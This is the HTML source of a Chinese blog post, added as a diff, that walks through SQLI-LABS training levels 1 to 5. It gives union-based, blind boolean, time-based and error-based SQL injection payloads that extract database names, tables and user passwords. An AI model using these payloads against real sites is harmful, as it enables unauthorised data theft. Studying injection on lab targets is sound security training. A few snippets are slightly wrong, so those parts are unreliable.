@@ -1,0 +1,1560 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
+<meta name="theme-color" content="#222"/>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2"/>
+
+<link rel="stylesheet" href="/css/main.css?v=6.7.0"/>
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.7.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.7.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.7.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.7.0" color="#222">
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '6.7.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="前言寒假无聊，加上最近也正好在学习数据库，所以顺便做一下sql注入天书SQLI-LABS，安装的话网上有很多的教程，按照教程的步骤做就可以。">
+<meta name="keywords" content="SQL注入">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQLI-LABS(Less1-Less10)">
+<meta property="og:url" content="http://chaosec.top/2018/02/04/sqli-labs1/index.html">
+<meta property="og:site_name" content="Charles&#39; Blog">
+<meta property="og:description" content="前言寒假无聊，加上最近也正好在学习数据库，所以顺便做一下sql注入天书SQLI-LABS，安装的话网上有很多的教程，按照教程的步骤做就可以。">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://chaosec.top/2018/02/04/sqli-labs1/1.png">
+<meta property="og:updated_time" content="2018-07-31T01:39:10.037Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="SQLI-LABS(Less1-Less10)">
+<meta name="twitter:description" content="前言寒假无聊，加上最近也正好在学习数据库，所以顺便做一下sql注入天书SQLI-LABS，安装的话网上有很多的教程，按照教程的步骤做就可以。">
+<meta name="twitter:image" content="http://chaosec.top/2018/02/04/sqli-labs1/1.png">
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Charles' Blog" type="application/atom+xml"/>
+
+
+
+
+  <link rel="canonical" href="http://chaosec.top/2018/02/04/sqli-labs1/"/>
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>SQLI-LABS(Less1-Less10) | Charles' Blog</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="bg_content">
+    <canvas id="canvas"></canvas>
+  </div>
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Charles' Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">前方如聂鲁达的爱情诗一般美好</p>
+      
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br/>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br/>关于</a>
+
+  </li>
+
+      
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br/>搜索</a>
+        </li>
+      
+    </ul>
+  
+
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://chaosec.top/2018/02/04/sqli-labs1/"/>
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="新城瑞雪"/>
+      <meta itemprop="description" content="相逢意气为君饮"/>
+      <meta itemprop="image" content="/images/avatar.gif"/>
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Charles' Blog"/>
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">SQLI-LABS(Less1-Less10)
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2018-02-04 14:59:55" itemprop="dateCreated datePublished" datetime="2018-02-04T14:59:55+08:00">2018-02-04</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2018-07-31 09:39:10" itemprop="dateModified" datetime="2018-07-31T09:39:10+08:00">2018-07-31</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/writeup/" itemprop="url" rel="index"><span itemprop="name">writeup</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+          
+
+          
+          
+            <span id="/2018/02/04/sqli-labs1/" class="leancloud_visitors" data-flag-title="SQLI-LABS(Less1-Less10)">
+              <span class="post-meta-divider">|</span>
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              
+                <span class="post-meta-item-text">阅读次数：</span>
+              
+                <span class="leancloud-visitors-count"></span>
+            </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>寒假无聊，加上最近也正好在学习数据库，所以顺便做一下sql注入天书SQLI-LABS，安装的话网上有很多的教程，按照教程的步骤做就可以。<br><a id="more"></a></p>
+<h1 id="系统数据库"><a href="#系统数据库" class="headerlink" title="系统数据库"></a>系统数据库</h1><p>我们先使用一下系统数据库<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> <span class="title">information_schema</span>;</span><br></pre></td></tr></table></figure></p>
+<p><img src="/2018/02/04/sqli-labs1/1.png" alt=""></p>
+<p>使用一下这个查询<br><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.<span class="built_in">tables</span> <span class="built_in">where</span> table_schema = <span class="string">"security"</span>;</span><br></pre></td></tr></table></figure></p>
+<p>这样的话可以得到表名列表</p>
+<p>所以可以利用<code>information_schema</code> 进行一次完整的注入，以下为一般流程：</p>
+<p>猜数据库<br><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schemata;</span><br></pre></td></tr></table></figure></p>
+<p>猜某库的数据表</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information.tables <span class="keyword">where</span> table_schema=<span class="string">'xxx'</span>;</span><br></pre></td></tr></table></figure>
+<p>猜表的所有列</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'xxx'</span>;</span><br></pre></td></tr></table></figure>
+<p>查找某列的内容<br><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> *** <span class="keyword">from</span> ***;</span><br></pre></td></tr></table></figure></p>
+<hr>
+<h1 id="LESS-1"><a href="#LESS-1" class="headerlink" title="LESS-1"></a>LESS-1</h1><p>这是我的第一关，所以要详细一点。<br>打开界面</p>
+<blockquote>
+<p>Please input the ID as parameter with numeric value</p>
+</blockquote>
+<p>题目提示我输入ID，尝试输入<code>id=1’</code>，发现报错。</p>
+<blockquote>
+<p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1’’ LIMIT 0,1’ at line 1</p>
+</blockquote>
+<p>发现是单引号未闭合，输入<code>?id=1’–+</code> 即可正常回显，接下来是爆字段</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span>' or <span class="number">1</span>=<span class="number">1</span> order by <span class="number">1</span>,<span class="number">2</span>--+</span><br></pre></td></tr></table></figure>
+<p>不断增加 <em>order by</em> 后面的数字，直到报错，到了4的时候报错，说明该表有三个字段。接下来使用union查询</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">-1</span>' union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>--+</span><br></pre></td></tr></table></figure>
+<p>这个<code>1,2,3</code> 只是为了保证 <em>union</em> 前后两个语句的列数相同，至于<code>id=-1</code> 则是为了使前一个查询无返回结果从而返回第二个 <em>select</em> 的查询结果。只需要将数字替换为相应的想要查询的信息即可，比如：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">database</span>(),<span class="keyword">user</span>()<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+<p>这样可以得到函数名，数据库名等信息。</p>
+<p>这里列举几个常用的函数：</p>
+<p><strong><em>系统函数：</em></strong></p>
+<blockquote>
+<p><strong>database()：</strong>数据库名<br><strong>version()：</strong> 数据库版本<br><strong>user()：</strong> 数据库用户名<br><strong>@@datadir：</strong> 数据库路径<br><strong>@@version_compile_os：</strong> 操作系统版本</p>
+</blockquote>
+<p><strong><em>字符串连接函数：</em></strong></p>
+<blockquote>
+<p><strong>concat(str1,str2,…)：</strong> 没有分隔符地连接字符串<br><strong>concat_ws(sep,str1,str2,…)：</strong> 含有分隔符的连接字符串，sep为分隔符，由ASCII码指定<br><strong>group_concat(str1,str2,…)：</strong> 连接一个组的所有字符串，中间以逗号隔开。</p>
+</blockquote>
+<p>利用系统数据库爆库名：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1'union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(schema_name),<span class="number">2</span> <span class="keyword">from</span> information_schema.schemata <span class="comment">--+</span></span><br></pre></td></tr></table></figure></p>
+<p>爆表名<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1'union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(table_name),<span class="number">2</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'security'</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure></p>
+<p>爆列名</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">id</span>=-1'union select 1,group_concat(column_name),3 <span class="keyword">from</span> information_schema.columns where <span class="attribute">table_name</span>=<span class="string">'users'</span>--+</span><br></pre></td></tr></table></figure>
+<p>爆数据</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">id</span>=-1'union select 1,username,password <span class="keyword">from</span><span class="built_in"> users </span>where <span class="attribute">id</span>=3--+</span><br></pre></td></tr></table></figure>
+<h1 id="LESS-2"><a href="#LESS-2" class="headerlink" title="LESS-2"></a>LESS-2</h1><p>尝试<code>?id=1’</code> 报错</p>
+<blockquote>
+<p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’ LIMIT 0,1’ at line 1</p>
+</blockquote>
+<p>发现是单引号出现了奇数次，查看源代码</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql="<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>=$<span class="keyword">id</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span><span class="string">"</span></span><br></pre></td></tr></table></figure>
+<p>是直接传递变量，所以直接传参数即可<code>?id=-1 union select 1,database(),version()</code></p>
+<p>接下来过程与第一个一样。</p>
+<h1 id="LESS-3"><a href="#LESS-3" class="headerlink" title="LESS-3"></a>LESS-3</h1><p>尝试<code>?id=1’</code>，得到报错信息：</p>
+<blockquote>
+<p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1’’) LIMIT 0,1’ at line 1</p>
+</blockquote>
+<p>可见是单引号后面加括号形成的查询语句，构造语句形成闭合<code>?id=1’)–+</code> 即可进行查询。</p>
+<h1 id="LESS-4"><a href="#LESS-4" class="headerlink" title="LESS-4"></a>LESS-4</h1><p>尝试<code>?id=1”</code>，得到报错信息：</p>
+<blockquote>
+<p> use near ‘“1””) LIMIT 0,1’ at line 1</p>
+</blockquote>
+<p>可知是双引号和括号的闭合，构造payload：<code>?id=1”)–+</code></p>
+<p><strong>小结</strong></p>
+<blockquote>
+<p>1-4关比较简单，错误也有回显，主要是引号括号等的闭合问题。</p>
+</blockquote>
+<hr>
+<p>第五关开始需要进行盲注，因为页面不再返回错误信息。</p>
+<h1 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a><em>盲注</em></h1><p><strong>盲注</strong> 是指在SQL注入的过程中，执行选择的语句不会正确回显到前段页面，需要我们利用一些方法判断或尝试，这个过程称为盲注。</p>
+<h2 id="一、基于布尔的SQL盲注–构造逻辑判断"><a href="#一、基于布尔的SQL盲注–构造逻辑判断" class="headerlink" title="一、基于布尔的SQL盲注–构造逻辑判断"></a>一、基于布尔的SQL盲注–构造逻辑判断</h2><h3 id="1、left-函数"><a href="#1、left-函数" class="headerlink" title="1、left()函数"></a>1、left()函数</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">left(database(),1)&gt;'s'           //left()函数</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><em>left(a,b)</em> 从左截取a的前b位</p>
+</blockquote>
+<h3 id="2、ascii-，substr-函数"><a href="#2、ascii-，substr-函数" class="headerlink" title="2、ascii()，substr()函数"></a>2、ascii()，substr()函数</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ascii(substr((<span class="keyword">select</span> table_name information_schema.tables <span class="keyword">where</span> tables_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">101</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><em>substr(a,b,c)</em>  从b位置开始，截取字符串a的c长度，<em>ascii()</em> 将单个字符转换为ascii码值</p>
+</blockquote>
+<h3 id="3、ascii-函数"><a href="#3、ascii-函数" class="headerlink" title="3、ascii()函数"></a>3、ascii()函数</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ascii(substr((<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">98</span></span><br></pre></td></tr></table></figure>
+<h3 id="4、ord-函数"><a href="#4、ord-函数" class="headerlink" title="4、ord()函数"></a>4、ord()函数</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ord(mid((<span class="keyword">select</span> <span class="keyword">ifnull</span>(<span class="keyword">cast</span>(username <span class="keyword">as</span> <span class="built_in">char</span>),<span class="number">0x20</span>) <span class="keyword">from</span> security.users <span class="keyword">order</span> <span class="keyword">by</span> <span class="keyword">id</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">98</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><em>mid(a,b,c)</em> 从位置b开始，截取a字符串的c位<br><em>ord()</em> 函数与ascii函数相同。</p>
+</blockquote>
+<h3 id="5、regexp正则注入"><a href="#5、regexp正则注入" class="headerlink" title="5、regexp正则注入"></a>5、regexp正则注入</h3><p><code>select user() regexp ‘^[a-z]’;</code>，这样会匹配user为root，如果正确返回1，那么<code>… regexp ‘^ro’</code> 则可以匹配第二位。</p>
+<h3 id="6、like匹配注入"><a href="#6、like匹配注入" class="headerlink" title="6、like匹配注入"></a>6、like匹配注入</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">user</span>() <span class="keyword">like</span> <span class="string">'ro%'</span>;</span><br></pre></td></tr></table></figure>
+<h2 id="二、基于报错的注入"><a href="#二、基于报错的注入" class="headerlink" title="二、基于报错的注入"></a>二、基于报错的注入</h2><h3 id="1、concat-计数报错"><a href="#1、concat-计数报错" class="headerlink" title="1、concat()计数报错"></a>1、concat()计数报错</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="number">0x3a</span>,<span class="number">0x3a</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x3a</span>,<span class="number">0x3a</span>,<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))  a <span class="keyword">from</span> information_schema.columns <span class="keyword">group</span> <span class="keyword">by</span> a;</span><br></pre></td></tr></table></figure>
+<p><em>explain</em></p>
+<blockquote>
+<p>需要注意三个点，一是需要concat()计数，二是floor，取得0 or1 ，进行数据的重复，三是<code>group by</code> 进行分组，此处会报错好像是因为MySQL的一个bug，<code>rand()</code> 有时候需要多试几次。</p>
+</blockquote>
+<p>如果关键的表被禁用的话，可以使用下面的方法</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="literal">null</span> <span class="keyword">union</span> <span class="keyword">select</span> !<span class="number">1</span>) <span class="keyword">group</span> <span class="keyword">by</span> <span class="keyword">concat</span>(<span class="keyword">version</span>(),<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))</span><br></pre></td></tr></table></figure>
+<p>如果rand被禁用了可以使用用户变量来报错</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">min</span>(@a:=<span class="number">1</span>) <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> <span class="keyword">concat</span>(<span class="keyword">password</span>,@a:=(@a+<span class="number">1</span>)%<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
+<h3 id="2、exp"><a href="#2、exp" class="headerlink" title="2、exp()"></a>2、exp()</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">exp</span>(~(<span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">user</span>())a))  //<span class="keyword">double</span>数值类型超出范围</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><code>exp()</code> 函数为以e为底的对数函数，版本在5.5.5及其之上，本例利用了exp报错</p>
+</blockquote>
+<h3 id="3、-0"><a href="#3、-0" class="headerlink" title="3、~0"></a>3、~0</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> !(<span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">user</span>())x) - ~<span class="number">0</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><code>bigint</code>类型超出范围，<code>~0</code> 是对0按位取反。</p>
+</blockquote>
+<h3 id="4、-xpath"><a href="#4、-xpath" class="headerlink" title="4、 xpath"></a>4、 xpath</h3><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">extractvalue</span>(<span class="number">1</span>,concat(<span class="number">0</span>x7a,(select <span class="variable">@@version</span>),<span class="number">0</span>x7e)) <span class="comment">//MySQL对XML数据进行修改的xpath函数，xpath语法错误。</span></span><br></pre></td></tr></table></figure>
+<h3 id="5、xpath"><a href="#5、xpath" class="headerlink" title="5、xpath"></a>5、xpath</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">updatexml(1,concat(0x7e,(<span class="keyword">select</span> @@<span class="keyword">version</span>),<span class="number">0x7e</span>),<span class="number">1</span>) //与第<span class="number">4</span>个相同原理</span><br></pre></td></tr></table></figure>
+<h3 id="6、重复特性"><a href="#6、重复特性" class="headerlink" title="6、重复特性"></a>6、重复特性</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">NAME_CONST</span>(<span class="keyword">version</span>(),<span class="number">1</span>),<span class="keyword">NAME_CONST</span>(<span class="keyword">version</span>(),<span class="number">1</span>))x; //mysql重复特性，此处重复了version，所以报错。</span><br></pre></td></tr></table></figure>
+<h2 id="基于时间的SQL盲注"><a href="#基于时间的SQL盲注" class="headerlink" title="基于时间的SQL盲注"></a>基于时间的SQL盲注</h2><h3 id="1、sleep-函数"><a href="#1、sleep-函数" class="headerlink" title="1、sleep()函数"></a>1、sleep()函数</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">If(ascii(substr(database(),1,1))&gt;115,0,sleep(5))# //if判断语句，条件为假，执行sleep</span><br></pre></td></tr></table></figure>
+<h3 id="2、benchmark-函数"><a href="#2、benchmark-函数" class="headerlink" title="2、benchmark()函数"></a>2、benchmark()函数</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(substring(current,1,1)=char(115),benchmark(50000000,encode('MSG','by 5 seconds')),null)</span><br></pre></td></tr></table></figure>
+<hr>
+<h1 id="LESS-5"><a href="#LESS-5" class="headerlink" title="LESS-5"></a>LESS-5</h1><p>尝试<code>?id=1’</code>,得到报错信息：</p>
+<blockquote>
+<p>use near ‘’1’’ LIMIT 0,1’ at line 1</p>
+</blockquote>
+<p>可知是单引号未闭合，构造payload：<code>?id=1’–+</code>，在盲注过程中，页面返回<code>You are in</code> 的时候才说明没有报错，反之则说明错误。</p>
+<h2 id="1、盲注四连"><a href="#1、盲注四连" class="headerlink" title="1、盲注四连"></a>1、盲注四连</h2><h3 id="1、利用-left-函数得到数据库名"><a href="#1、利用-left-函数得到数据库名" class="headerlink" title="1、利用 left() 函数得到数据库名"></a><strong>1、利用 <em>left()</em> 函数得到数据库名</strong></h3><p>此时想得到信息可以尝试<code>?id=1’ and left(version(),1)=5–+</code> 如果版本号第一个数字是5则会返回<code>You are in</code>，如果错误的话则不能正确的返回信息，比如<code>?id=1’ and left(version(),1)=6–+</code>，则无法正确回显。继续进行下去可以盲注出更多信息<code>?id=1’ and left(version(),4)=concat(‘5.7.’)–+</code> 。</p>
+<p>看一下数据库名的长度<code>?id=1’ and length(database())=8–+</code>，可以正确回显，说明数据库名长度就是8，接下来爆数据库名<code>?id=1’ and left(database(),1)&gt;’a’–+</code>，这个数据库第一个字母是s，显然成立，具体不知道时可以用二分法，接下来爆第二位<code>?id=1’ and left(database(),2)&gt;’sa’–+</code> 可以一步步爆出所有字段。</p>
+<h3 id="2、利用-substr-ascii-函数得到表名"><a href="#2、利用-substr-ascii-函数得到表名" class="headerlink" title="2、利用 substr() , ascii() 函数得到表名"></a><strong>2、利用 <em>substr()</em> , <em>ascii()</em> 函数得到表名</strong></h3><p>前面已经得到数据库名为<code>security</code> ，接下里爆表：<code>?id=1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101–+</code> ，当然，这里的 <code>database()</code> 也可以换成 <code>security</code> ，作用是相同的。一步步改变 <code>substr()</code>即可爆出第一个表为 <code>emails</code>。改变 <code>limit()</code> 参数即可爆出所有表。此处也可以不用 <code>ascii()</code> 函数，<code>?id=1’ and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,2)=’ea’</code> 同样可以实现要求。</p>
+<h3 id="3、利用-regexp-函数得到列名"><a href="#3、利用-regexp-函数得到列名" class="headerlink" title="3、利用 regexp() 函数得到列名"></a><strong>3、利用 <em>regexp()</em> 函数得到列名</strong></h3><p>接下来爆users表的列名，<code>?id=1’ and 1=(select 1 from information_schema.columns where table_name=’user’ and column_name regexp ‘username’ limit 0,1)–+</code>，改变 <code>regexp()</code> 参数即可继续爆出其他列名。</p>
